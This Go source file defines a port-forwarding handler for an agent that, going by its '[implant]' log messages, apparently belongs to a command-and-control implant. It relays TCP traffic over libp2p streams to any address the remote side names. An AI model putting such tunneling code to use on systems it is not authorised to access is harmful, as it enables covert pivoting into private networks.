package core

import (
	"bufio"
	"io"
	"log"
	"net"
	"strings"
	"time"

	"github.com/libp2p/go-libp2p/core/network"
)

func (a *Agent) handlePortfwdStream(s network.Stream) {
	defer s.Close()

	br := bufio.NewReader(io.LimitReader(s, 1024))
	target, err := br.ReadString('\n')
	if err != nil {
		log.Printf("[implant] portfwd read target: %v", err)
		return
	}
	target = strings.TrimSpace(target)

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		log.Printf("[implant] portfwd dial %s: %v", target, err)
		return
	}
	defer conn.Close()

	go io.Copy(conn, io.MultiReader(br, s))
	io.Copy(s, conn)
}
